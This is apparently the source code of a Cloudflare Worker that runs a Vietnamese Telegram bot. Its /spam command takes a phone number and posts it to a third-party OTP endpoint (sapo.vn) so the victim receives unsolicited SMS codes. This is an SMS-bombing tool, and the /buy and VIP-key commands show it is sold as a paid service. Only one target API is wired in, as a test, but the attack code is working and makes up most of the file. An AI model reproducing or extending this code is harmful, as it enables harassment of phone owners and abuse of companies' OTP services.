"""Cloudflare Worker entry — Telegram webhook handler (Fixed Proxy)."""
from js import Response, fetch, Headers, Object
from pyodide.ffi import to_js
import json, os, time, re

# Đọc config từ biến môi trường
TOKEN = os.environ.get("BOT_TOKEN") or ""
ADMIN_IDS = {int(x) for x in (os.environ.get("ADMIN_IDS") or "").split(",") if x.strip().isdigit()}
MAX_SUB = int(os.environ.get("MAX_SUBREQUESTS") or "45")

# Hàm gọi Telegram API bằng fetch thuần của JS
async def tg_api(method: str, payload: dict):
    headers = Headers.new()
    headers.set("content-type", "application/json")
    req_obj = {
        "method": "POST",
        "headers": headers,
        "body": json.dumps(payload)
    }
    try:
        resp = await fetch(f"https://api.telegram.org/bot{TOKEN}/{method}", Object.fromEntries(to_js(req_obj)))
        return await resp.json()
    except Exception as e:
        print(f"Telegram API error: {e}")
        return {}

def _valid(p: str) -> bool:
    return bool(re.fullmatch(r"(\+?84|0)\d{9,10}", re.sub(r"[^\d+]", "", p)))

async def handle_command(env, msg):
    text = msg.get("text", "").strip()
    if not text.startswith("/"):
        return

    cmd = text.split()[0].split("@")[0]
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    msg_id = msg["message_id"]

    # Lệnh /start
    if cmd in ["/start", "/help"]:
        txt = (
            f"👋 Chào <b>{msg['from'].get('first_name','')}</b>\n"
            "Bot đã hoạt động!\n\n"
            "<b>Lệnh:</b>\n"
            "/spam <code>&lt;sđt&gt; [vòng]</code> — Bắn SMS\n"
            "/mykey — Xem hạn VIP\n"
            "/buy — Bảng giá"
        )
        await tg_api("sendMessage", {"chat_id": chat_id, "text": txt, "parse_mode": "HTML", "reply_to_message_id": msg_id})
        return

    # Lệnh /spam (Test cơ bản)
    if cmd == "/spam":
        parts = text.split()
        if len(parts) < 2:
            await tg_api("sendMessage", {"chat_id": chat_id, "text": "Dùng: /spam <sđt>", "reply_to_message_id": msg_id})
            return
        
        phone = parts[1]
        if not _valid(phone):
            await tg_api("sendMessage", {"chat_id": chat_id, "text": "❌ SĐT không hợp lệ", "reply_to_message_id": msg_id})
            return

        # Báo đang bắn
        m = await tg_api("sendMessage", {"chat_id": chat_id, "text": f"🚀 Đang bắn {phone}...", "reply_to_message_id": msg_id})
        
        # Bắn thử 1 API (Sapo) để test xem fetch của JS có chạy không
        req = {
            "method": "POST",
            "headers": Headers.new(Object.fromEntries(to_js({"content-type": "application/x-www-form-urlencoded"}))),
            "body": f"phonenumber={phone}"
        }
        try:
            resp = await fetch("https://www.sapo.vn/fnb/sendotp", Object.fromEntries(to_js(req)))
            status = resp.status
        except Exception as e:
            status = f"Lỗi: {e}"

        # Báo xong
        if m and "result" in m:
            await tg_api("editMessageText", {
                "chat_id": chat_id, 
                "message_id": m["result"]["message_id"], 
                "text": f"✅ Đã chạy xong lệnh bắn.\nTrạng thái API: {status}"
            })
        return

    # Lệnh /mykey
    if cmd == "/mykey":
        await tg_api("sendMessage", {"chat_id": chat_id, "text": "Chức năng đang cập nhật.", "reply_to_message_id": msg_id})
        return

# Hàm nhận request từ Telegram
async def on_fetch(request, env, ctx):
    if request.method != "POST":
        return Response.new("Bot alive", {"status": 200})
    
    try:
        body = await request.text()
        update = json.loads(body)
    except Exception:
        return Response.new("bad json", {"status": 400})
    
    msg = update.get("message")
    if msg:
        try:
            # Chạy lệnh trực tiếp, không dùng ctx.waitUntil
            await handle_command(env, msg)
        except Exception as e:
            print(f"Handler error: {e}")
            
    return Response.new("ok", {"status": 200})

def fetch_handler(request, env, ctx):
    return on_fetch(request, env, ctx)
